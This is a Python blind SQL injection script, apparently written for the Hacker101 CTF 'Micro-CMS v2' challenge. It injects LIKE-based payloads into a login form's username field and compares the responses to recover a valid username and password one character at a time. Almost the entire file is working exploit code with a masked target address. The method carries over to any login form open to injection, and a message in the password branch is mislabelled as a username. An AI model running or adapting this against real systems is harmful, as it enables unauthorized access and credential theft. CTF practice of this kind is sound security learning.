# Made for Hacker101 CTF - Micro-CMS v2
# I'm not responsible for whatever you do with this
# Given a sqli injectable param, in this case: username, and known length of valid credential set, determines the valid params on the back end
# Could just use BurpSuite, Hydra, or any other list based brute forcer, but I wanted to try to do this the old fashioned way, just like you would with manual blind SQLi
# Also, this assumes a very simple character set and small credential lengths, as is fitting for this level of CTF challenge

import requests

# assume a simple charset as this is an easy challenge, change to your liking if you're feeling nifty
valid_chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
password_length = 5
username_length = 5
response_dork = 'Invalid password' # Content in response to look for if sqli evaluates true
target_url = 'http://###.###.###.###/##########/login'
username = None
password = None
temp_user_string = '_' * username_length
temp_pass_string = '_' * password_length
valid_user_chars = []
valid_pass_chars = []

print('Starting enumeration...')

# Find the username
for z in range(0,username_length):
	user_char_list = list(temp_user_string)
	for character in valid_chars:
		user_char_list[z] = character
		temp = ''
		for sub_char in user_char_list:
			temp += sub_char
		dork = "' or username LIKE '%s'#" % temp
		data = {'username':dork,'password':'foo'}
		response = requests.post(target_url,data=data)
		if response_dork in response.text:
			valid_user_chars.append(character)

if len(valid_user_chars) == username_length:
	temp = ''
	for sub_char in valid_user_chars:
		temp += sub_char
	username = temp
	print('Possible username found: %s' % username)
else:
	print('Unable to brute the username!')
	print('Chars found: %s' % valid_user_chars)
		
# Find the password
for z in range(0,password_length):
	pass_char_list = list(temp_pass_string)
	for character in valid_chars:
		pass_char_list[z] = character
		temp = ''
		for sub_char in pass_char_list:
			temp += sub_char
		dork = "' or password LIKE '%s'#" % temp
		data = {'username':dork,'password':'foo'}
		response = requests.post(target_url,data=data)
		if response_dork in response.text:
			valid_pass_chars.append(character)

if len(valid_pass_chars) == password_length:
	temp = ''
	for sub_char in valid_pass_chars:
		temp += sub_char
	password = temp
	print('Possible username found: %s' % password)
else:
	print('Unable to brute the password!')
	print('Chars found: %s' % valid_pass_chars)

